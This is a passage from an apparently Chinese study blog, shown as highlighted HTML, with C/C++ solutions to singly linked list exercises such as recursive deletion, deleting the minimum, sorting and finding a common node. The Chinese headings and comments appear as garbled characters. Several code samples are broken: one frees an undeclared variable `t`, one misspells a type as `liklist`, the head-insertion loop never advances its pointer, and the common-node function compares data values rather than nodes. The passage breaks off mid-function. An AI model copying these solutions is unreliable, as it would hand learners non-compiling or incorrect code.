p<span class="token punctuation">;</span>            pc <span class="token operator">=</span> p<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            <span class="token comment">//å°¾æ’</span>            p<span class="token operator">-></span>next <span class="token operator">=</span> pb<span class="token operator">-></span>next<span class="token punctuation">;</span>            pb<span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token punctuation">;</span>            pb <span class="token operator">=</span> p<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        p <span class="token operator">=</span> temp<span class="token punctuation">;</span>        i<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    A <span class="token operator">=</span> LC<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="9-è®¾è®¡ä¸€ä¸ªé€’å½’ç®—æ³•ï¼Œåˆ é™¤ä¸å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨Lä¸­æ‰€æœ‰å€¼ä¸ºxçš„ç»“ç‚¹-ç»Ÿè®¡å€¼ç­‰äºxçš„æ•°ç›®-int-CountX-Lnode-HL-ElemType-x">9)   è®¾è®¡ä¸€ä¸ªé€’å½’ç®—æ³•ï¼Œåˆ é™¤ä¸å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨Lä¸­æ‰€æœ‰å€¼ä¸ºxçš„ç»“ç‚¹(ç»Ÿè®¡å€¼ç­‰äºxçš„æ•°ç›®) int CountX(Lnode * HL, ElemType x)</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token keyword">void</span> <span class="token function">del</span><span class="token punctuation">(</span>LinkList <span class="token operator">&amp;</span>L<span class="token punctuation">,</span>ElemType x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    LinkList temp<span class="token punctuation">;</span> <span class="token comment">// åšé‡Šæ”¾ç”¨</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>L<span class="token operator">==</span><span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token comment">//  ç»“æŸæ¡ä»¶</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>L<span class="token operator">-></span>data <span class="token operator">==</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        temp <span class="token operator">=</span> L<span class="token punctuation">;</span>        L <span class="token operator">=</span> L <span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token function">free</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">del</span><span class="token punctuation">(</span>L<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">del</span><span class="token punctuation">(</span>L<span class="token operator">-></span>next<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// é€’å½’ç»Ÿè®¡</span><span class="token keyword">int</span> ct <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">count</span><span class="token punctuation">(</span>LinkList <span class="token operator">&amp;</span>L<span class="token punctuation">,</span>ElemType x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>L <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>L<span class="token operator">-></span>data <span class="token operator">==</span> x<span class="token punctuation">)</span> ct<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token function">count</span><span class="token punctuation">(</span>L<span class="token operator">-></span>next<span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="10-åœ¨å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨Lä¸­ï¼Œåˆ é™¤æ‰€æœ‰å€¼ä¸ºxçš„ç»“ç‚¹ï¼Œå¹¶é‡Šæ”¾ç©ºé—´ï¼Œå‡è®¾å€¼ä¸ºxçš„ç»“ç‚¹ä¸å”¯ä¸€ï¼Œè¯•ç¼–å†™ç®—æ³•ä»¥å®ç°ä¸Šè¿°æ“ä½œã€‚">10)  åœ¨å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨Lä¸­ï¼Œåˆ é™¤æ‰€æœ‰å€¼ä¸ºxçš„ç»“ç‚¹ï¼Œå¹¶é‡Šæ”¾ç©ºé—´ï¼Œå‡è®¾å€¼ä¸ºxçš„ç»“ç‚¹ä¸å”¯ä¸€ï¼Œè¯•ç¼–å†™ç®—æ³•ä»¥å®ç°ä¸Šè¿°æ“ä½œã€‚</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token keyword">void</span> <span class="token function">del_x</span><span class="token punctuation">(</span>linklist <span class="token operator">&amp;</span>L<span class="token punctuation">,</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>   linklist p<span class="token punctuation">,</span>temp<span class="token punctuation">,</span>pre<span class="token punctuation">;</span>    p <span class="token operator">=</span> L<span class="token operator">-></span>next<span class="token punctuation">,</span>pre <span class="token operator">=</span> L<span class="token punctuation">;</span> <span class="token comment">// pre é˜²æ­¢æ–­é“¾</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">-></span>data <span class="token operator">==</span> x<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            temp <span class="token operator">=</span> p<span class="token punctuation">;</span>            p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>            pre <span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token punctuation">;</span>            <span class="token function">free</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span> <span class="token comment">// åŒæ—¶åç§»</span>        pre <span class="token operator">=</span> p<span class="token punctuation">;</span>        p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="11-è®¾Lä¸ºå¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨ï¼Œç¼–å†™ç®—æ³•å®ç°ä»å°¾åˆ°å¤´åå‘è¾“å‡ºæ¯ä¸ªç»“ç‚¹çš„å€¼-å¤´æ’æ³•å»ºè¡¨ï¼Œéå†">11)  è®¾Lä¸ºå¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨ï¼Œç¼–å†™ç®—æ³•å®ç°ä»å°¾åˆ°å¤´åå‘è¾“å‡ºæ¯ä¸ªç»“ç‚¹çš„å€¼(å¤´æ’æ³•å»ºè¡¨ï¼Œéå†)</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">//æ³•ä¸€ï¼š ä¸€è¾¹éå†ä¸€è¾¹å¤´æ’æ³•å»ºç«‹æ–°è¡¨</span>linklist <span class="token function">create_head</span><span class="token punctuation">(</span>linklist <span class="token operator">&amp;</span>L<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>     liklist newL<span class="token punctuation">,</span>p<span class="token punctuation">,</span>q<span class="token punctuation">;</span>    newL <span class="token operator">=</span> new <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    newL<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>    p <span class="token operator">=</span> L<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        q <span class="token operator">=</span> new <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        q<span class="token operator">-></span>data <span class="token operator">=</span> p<span class="token operator">-></span>data<span class="token punctuation">;</span>        q<span class="token operator">-></span>next <span class="token operator">=</span> newL<span class="token operator">-></span>next<span class="token punctuation">;</span>        newL<span class="token operator">-></span>next <span class="token operator">=</span> q<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> newL<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">Visit</span><span class="token punctuation">(</span>linklist L<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linklist p<span class="token punctuation">;</span>    p<span class="token operator">=</span>L<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d "</span><span class="token punctuation">,</span>p<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>        p<span class="token operator">=</span>p<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>æ³•äºŒï¼š<span class="token comment">// é‡‡ç”¨é€’å½’è¾“å‡º æ ˆçš„æ€æƒ³</span><span class="token keyword">void</span> <span class="token function">R_p</span><span class="token punctuation">(</span>linklist L<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span>L<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">R_p</span><span class="token punctuation">(</span>L<span class="token operator">-></span>next<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>cout<span class="token operator">&lt;&lt;</span>L<span class="token operator">-></span>data<span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="12-è¯•ç¼–å†™åœ¨å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨Lä¸­åˆ é™¤ä¸€ä¸ªæœ€å°å€¼ç»“ç‚¹çš„é«˜æ•ˆç®—æ³•ï¼ˆå‡è®¾æœ€å°å€¼ç»“ç‚¹æ—¶å”¯ä¸€çš„ï¼‰">12)  è¯•ç¼–å†™åœ¨å¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨Lä¸­åˆ é™¤ä¸€ä¸ªæœ€å°å€¼ç»“ç‚¹çš„é«˜æ•ˆç®—æ³•ï¼ˆå‡è®¾æœ€å°å€¼ç»“ç‚¹æ—¶å”¯ä¸€çš„ï¼‰</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token keyword">void</span> <span class="token function">delete_MinX</span><span class="token punctuation">(</span>linklist <span class="token operator">&amp;</span>L<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linklist pre<span class="token punctuation">,</span>p<span class="token punctuation">,</span>minp<span class="token punctuation">,</span>minpre<span class="token punctuation">;</span>    pre <span class="token operator">=</span> L<span class="token punctuation">;</span> p <span class="token operator">=</span> L<span class="token operator">-></span>next<span class="token punctuation">;</span><span class="token comment">// pre æŒ‡å‘å‰é©±</span>   minp <span class="token operator">=</span> p<span class="token punctuation">,</span>minpre <span class="token operator">=</span> pre<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token comment">// éå†å¯»æ‰¾æœ€å°å€¼</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">-></span>data <span class="token operator">&lt;=</span> minp<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            minp <span class="token operator">=</span> p<span class="token punctuation">;</span>            minpre <span class="token operator">=</span> pre<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        pre <span class="token operator">=</span> p<span class="token punctuation">;</span>        p <span class="token operator">=</span> p <span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// åˆ é™¤minp ç»“ç‚¹</span>    minpre<span class="token operator">-></span>next <span class="token operator">=</span> minp<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>minp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details></div><h2 id="13-æœ‰ä¸€ä¸ªå¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨Lï¼Œè®¾è®¡ä¸€ä¸ªç®—æ³•ä½¿å…¶å…ƒç´ é€’å¢æœ‰åº">13)  æœ‰ä¸€ä¸ªå¸¦å¤´ç»“ç‚¹çš„å•é“¾è¡¨Lï¼Œè®¾è®¡ä¸€ä¸ªç®—æ³•ä½¿å…¶å…ƒç´ é€’å¢æœ‰åº</h2><div class="story post-story"><p><img src="https://img-blog.csdnimg.cn/img_convert/f9afd526f2074191285c684f14a22934.png" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/img_convert/f9afd526f2074191285c684f14a22934.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20200828213127042"></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">// ç©ºé—´æ¢æ—¶é—´O(n^2) è€ƒçš„æ¦‚ç‡ä¸å¤§</span><span class="token keyword">void</span> <span class="token function">sort</span><span class="token punctuation">(</span>linklist <span class="token operator">&amp;</span>L<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linklist p<span class="token punctuation">,</span>pre<span class="token punctuation">,</span>rear<span class="token punctuation">;</span>    p <span class="token operator">=</span> L<span class="token operator">-></span>next<span class="token punctuation">;</span>    rear <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment">// rear ä¿ç•™påé¢çš„é“¾è¡¨ä¿è¯ä¸æ–­é“¾</span>    p<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token comment">// è®© L åªæœ‰ä¸€ä¸ªç»“ç‚¹ï¼Œ é‡æ„ L</span>    p <span class="token operator">=</span> rear<span class="token punctuation">;</span> <span class="token comment">// éå†å‰©ä¸‹çš„å†…å®¹é“¾è¡¨</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        rear <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>        pre <span class="token operator">=</span> L<span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>pre<span class="token operator">-></span>next<span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> pre<span class="token operator">-></span>next<span class="token operator">-></span>data <span class="token operator">&lt;</span> p<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token comment">// åœ¨æ–°Lä¸­æ‰¾åˆ°p->dataåº”è¯¥çš„ä½ç½®</span>            pre <span class="token operator">=</span> pre<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        p<span class="token operator">-></span>next <span class="token operator">=</span> pre<span class="token operator">-></span>next<span class="token punctuation">;</span> <span class="token comment">// å°¾æ’æ³• æŠŠ p æ’å…¥åˆ°æ–°L ä¸­</span>        pre <span class="token operator">-></span> next <span class="token operator">=</span> p<span class="token punctuation">;</span><span class="token comment">// å°¾æ’æ³• æŠŠ p æ’å…¥åˆ° æ–°L ä¸­</span>        p <span class="token operator">=</span> rear<span class="token punctuation">;</span> <span class="token comment">// ç»§ç»­éå† æ—§L å‰©ä¸‹çš„å†…å®¹</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><p><img src="https://img-blog.csdnimg.cn/20200824223913524.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200824223913524.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></div><h2 id="14-è®¾åœ¨ä¸€ä¸ªå¸¦è¡¨ç»“ç‚¹çš„å•é“¾è¡¨ä¸­æ‰€æœ‰å…ƒç´ ç»“ç‚¹çš„æ•°æ®å€¼æ— åºï¼Œè¯•ç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œåˆ é™¤è¡¨ä¸­æ‰€æœ‰ä»‹äºç»™å®šçš„ä¸¤ä¸ªå€¼ï¼ˆä½œä¸ºå‡½æ•°å‚æ•°ç»™å‡ºï¼‰ä¹‹é—´çš„å…ƒç´ çš„å…ƒç´ ï¼ˆè‹¥å­˜åœ¨ï¼‰">14)  <strong>è®¾åœ¨ä¸€ä¸ªå¸¦è¡¨ç»“ç‚¹çš„å•é“¾è¡¨ä¸­æ‰€æœ‰å…ƒç´ ç»“ç‚¹çš„æ•°æ®å€¼æ— åºï¼Œè¯•ç¼–å†™ä¸€ä¸ªå‡½æ•°ï¼Œåˆ é™¤è¡¨ä¸­æ‰€æœ‰ä»‹äºç»™å®šçš„ä¸¤ä¸ªå€¼ï¼ˆä½œä¸ºå‡½æ•°å‚æ•°ç»™å‡ºï¼‰ä¹‹é—´çš„å…ƒç´ çš„å…ƒç´ ï¼ˆè‹¥å­˜åœ¨ï¼‰</strong></h2><div class="story post-story"><p>æ•°å­—ä¹‹é—´ï¼Œå­—æ¯ä¹‹é—´ç­‰é—®é¢˜</p><img src="https://gitee.com/sizaif/images/raw/master/img/20201111233535.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20201111233535.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201111233535101" style="zoom:50%;" /><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token keyword">void</span> <span class="token function">delete_between</span><span class="token punctuation">(</span>linklist <span class="token operator">&amp;</span>L<span class="token punctuation">,</span>ElemType x<span class="token punctuation">,</span>ElemType y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linklist p<span class="token punctuation">,</span>pre<span class="token punctuation">,</span>temp<span class="token punctuation">;</span>    p <span class="token operator">=</span>  L<span class="token operator">-></span>next<span class="token punctuation">;</span>    pre <span class="token operator">=</span> L<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">-></span>data <span class="token operator">>=</span> x <span class="token operator">&amp;&amp;</span> p<span class="token operator">-></span>data <span class="token operator">&lt;=</span> y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// å¦‚æœä»‹äºä¹‹é—´</span>            <span class="token comment">// åˆ é™¤</span>            pre<span class="token operator">-></span>next <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>            <span class="token function">free</span><span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>            p <span class="token operator">=</span> pre<span class="token operator">-></span>next<span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span> <span class="token comment">// å¦åˆ™ç»§ç»­éå†</span>            pre <span class="token operator">=</span> p<span class="token punctuation">;</span>            p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details>## 15)  **ç»™å®šä¸¤ä¸ªå•é“¾è¡¨ï¼Œç¼–å†™ç®—æ³•æ‰¾å‡ºä¸¤ä¸ªé“¾è¡¨çš„å…¬å…±ç»“ç‚¹ã€‚**<p>æŒæ¡è§£é¢˜æ€æƒ³ï¼Œå…ˆèµ°kæ­¥ï¼Œç„¶åä¸€åŒèµ°ï¼Œ<br><img src="https://gitee.com/sizaif/images/raw/master/img/20201111233605.png" class="lazyload" data-srcset="https://gitee.com/sizaif/images/raw/master/img/20201111233605.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20201111233605129" style="zoom:80%;" /></p><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">// å…¬å…±ç»“ç‚¹æŒ‡ï¼Œ ä¸¤ä¸ªé“¾è¡¨ä»æŸä¸€ç»“ç‚¹å¼€å§‹ï¼Œ nextéƒ½æŒ‡å‘åŒä¸€ä¸ªèŠ‚ç‚¹ Yå‹</span><span class="token comment">// é•¿çš„å…ˆèµ°kæ­¥,ç„¶åä¸€åŒèµ°,ç¬¬ä¸€ä¸ªç›¸åŒçš„ç»“ç‚¹å³ä¸ºå…¬å…±ç»“ç‚¹åˆå§‹ç‚¹</span>linklist <span class="token function">Common</span><span class="token punctuation">(</span>linklist A<span class="token punctuation">,</span>linklist B<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linklist pa<span class="token punctuation">,</span>pb<span class="token punctuation">;</span>    <span class="token keyword">int</span> lena <span class="token operator">=</span> <span class="token number">0</span> <span class="token punctuation">,</span>lenb <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>k<span class="token punctuation">;</span>    pa <span class="token operator">=</span> A<span class="token operator">-></span>next<span class="token punctuation">;</span>    pb <span class="token operator">=</span> B<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token comment">// æ±‚lena lenb </span>    <span class="token keyword">while</span><span class="token punctuation">(</span>pa<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        lena<span class="token operator">++</span><span class="token punctuation">;</span>pa<span class="token operator">=</span>pa<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>pb<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        lenb<span class="token operator">++</span><span class="token punctuation">;</span>pb<span class="token operator">=</span>pb<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// é•¿é“¾èµ‹ç»™ pa æ–­é“¾ èµ‹ç»™ pb</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>lena<span class="token operator">></span>lenb<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        k <span class="token operator">=</span> lena<span class="token operator">-</span>lenb<span class="token punctuation">;</span>        pa <span class="token operator">=</span> A<span class="token operator">-></span>next<span class="token punctuation">;</span>        pb <span class="token operator">=</span> B<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>      k <span class="token operator">=</span> lenb<span class="token operator">-</span>lena<span class="token punctuation">;</span>          pa <span class="token operator">=</span> B<span class="token operator">-></span>next<span class="token punctuation">;</span>        pb <span class="token operator">=</span> A<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>   <span class="token comment">// å…ˆèµ°kæ­¥</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>k<span class="token operator">--</span><span class="token punctuation">)</span> pa <span class="token operator">=</span> pa<span class="token operator">-></span>next<span class="token punctuation">;</span>   <span class="token comment">// åŒæ—¶èµ°ï¼Œç¬¬ä¸€ä¸ªç›¸åŒçš„ç»“ç‚¹å³ä¸ºå…¬å…±é“¾çš„èµ·ç‚¹</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>pa<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span> pa<span class="token operator">-></span>data <span class="token operator">==</span> pb<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> pa<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span>        <span class="token punctuation">&#123;</span>            pa <span class="token operator">=</span> pa<span class="token operator">-></span>next<span class="token punctuation">;</span>            pb <span class="token operator">=</span> pb<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token constant">NULL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre>              </div>            </details><p><img src="https://img-blog.csdnimg.cn/20200824223956325.png#pic_center" class="lazyload" data-srcset="https://img-blog.csdnimg.cn/20200824223956325.png#pic_center" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p></div><h2 id="16-ç»™å®šä¸€ä¸ªå¸¦è¡¨å¤´ç»“ç‚¹çš„å•é“¾è¡¨ï¼Œè®¾headä¸ºå¤´æŒ‡é’ˆï¼Œç»“ç‚¹çš„ç»“æ„ä¸ºï¼ˆdataï¼Œnextï¼‰ï¼Œdataä¸ºæ•´å½¢å…ƒç´ ï¼Œnextä¸ºæŒ‡é’ˆï¼Œè¯•å†™å‡ºç®—æ³•ï¼šæŒ‰é€’å¢æ¬¡åºè¾“å‡ºå•é“¾è¡¨ä¸­å„ç»“ç‚¹çš„æ•°æ®å…ƒç´ ï¼Œå¹¶é‡Šæ”¾ç»“ç‚¹æ‰€å çš„å­˜å‚¨ç©ºé—´-æ³¨æ„-ï¼šä¸å…è®¸ä½¿ç”¨æ•°ç»„ä½œä¸ºè¾…åŠ©ç©ºé—´ï¼‰">16)  ç»™å®šä¸€ä¸ªå¸¦è¡¨å¤´ç»“ç‚¹çš„å•é“¾è¡¨ï¼Œè®¾headä¸ºå¤´æŒ‡é’ˆï¼Œç»“ç‚¹çš„ç»“æ„ä¸ºï¼ˆdataï¼Œnextï¼‰ï¼Œdataä¸ºæ•´å½¢å…ƒç´ ï¼Œnextä¸ºæŒ‡é’ˆï¼Œè¯•å†™å‡ºç®—æ³•ï¼šæŒ‰é€’å¢æ¬¡åºè¾“å‡ºå•é“¾è¡¨ä¸­å„ç»“ç‚¹çš„æ•°æ®å…ƒç´ ï¼Œå¹¶é‡Šæ”¾ç»“ç‚¹æ‰€å çš„å­˜å‚¨ç©ºé—´ (æ³¨æ„)ï¼šä¸å…è®¸ä½¿ç”¨æ•°ç»„ä½œä¸ºè¾…åŠ©ç©ºé—´ï¼‰</h2><div class="story post-story"><details green><summary> code </summary>              <div class='content'>              <pre class="language-c" data-language="c"><div class="caption"><span>++</span></div><code class="language-c"><span class="token comment">// æ¯æ¬¡å¯»æ‰¾æœ€å°çš„ç»“ç‚¹è¾“å‡º O(n^2)</span><span class="token comment">// preè®°å½•çš„æ˜¯æœ€å°å€¼çš„å‰é©±ï¼Œpre->next æ—¢ä¸ºæœ€å°å€¼ç»“ç‚¹</span><span class="token comment">// p ç›¸ç­‰äºè®°å½•çš„æ˜¯æœ€å°å€¼ç»“ç‚¹</span><span class="token comment">// æ¯æ¬¡æ¯”è¾ƒçš„æ˜¯ p->next->data ä¸ pre->next->dataï¼› å³ æœ€å°å€¼åä¸€ä¸ªç»“ç‚¹ä¸æœ€å°å€¼ç»“ç‚¹</span><span class="token keyword">void</span> <span class="token function">fun</span><span class="token punctuation">(</span>linklist <span class="token operator">&amp;</span>Head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>Head<span class="token operator">-></span>next<span class="token operator">!=</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    linklist pre<span class="token punctuation">,</span>p<span class="token punctuation">,</span>temp<span class="token punctuation">;</span>        pre <span class="token operator">=</span> Head<span class="token punctuation">;</span>p <span class="token operator">=</span> pre<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token comment">// å¯»æ‰¾æœ€å°å€¼ç»“ç‚¹</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>p<span class="token operator">-></span>next<span class="token operator">!=</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token comment">// pre->nextä¸ºæœ€å°å€¼ç»“ç‚¹ï¼Œ p->nextä¸ºæœ€å°å€¼ç»“ç‚¹åç»§ä¸€ä¸ªç»“ç‚¹</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>p<span class="token operator">-></span>next<span class="token operator">-></span>data <span class="token operator">&lt;</span> pre<span class="token operator">-></span>next<span class="token operator">-></span>data <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                pre <span class="token operator">=</span> p<span class="token punctuation">;</span> <span class="token comment">//updata</span>            <span class="token punctuation">&#125;</span>            p <span class="token operator">=</span> p<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        